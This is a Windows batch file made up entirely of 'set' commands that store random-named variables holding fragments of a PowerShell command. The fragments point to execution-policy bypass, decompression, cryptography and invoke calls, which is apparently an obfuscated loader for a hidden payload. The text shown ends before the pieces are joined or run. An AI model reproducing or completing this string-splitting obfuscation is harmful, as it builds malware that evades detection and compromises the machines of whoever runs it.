@echo off
set "FeQhKoeGzT=::('"
set "hGWVgoKkcK=stem"
set "tkdPDuDvmY=-joi"
set "FKpqgQMcVO=oint"
set "CkZlJojXzJ=bypa"
set "wNmyiGPGGc=comp"
set "qiOshevfKY=iron"
set "bFgiwKgRJr=BC;$"
set "lsgDAPWhWW='[-1"
set "AGvGGTfbiE=;$aV"
set "ijZjOBOfdL=y.Cr"
set "AtJfBWpPzs=ion."
set "ztBOKdteEf=ress"
set "xkFHxGuVGC=saBm"
set "BPDVzvWfNq=rity"
set "rjmhhhutlF=PcJO"
set "LJMsXcMAQG=tsWi"
set "iboTPcWBPV=uGwa"
set "PcLgIbbupA=O.Pa"
set "llcnneybjp=ke($"
set "rFIkntursN=YxVw"
set "jlJqagTSsp= = ["
set "GTSWgdBAsT=gjYA"
set "hQeeidUreS=.Mod"
set "TVNjrAFuZY=waZ."
set "PdXxslyLHh=();$"
set "NbGdAdxjpL=Fina"
set "xoXUZeaJjR=gnir"
set "eINXgnJnOm=[]] "
set "eFxmhGATih=pose"
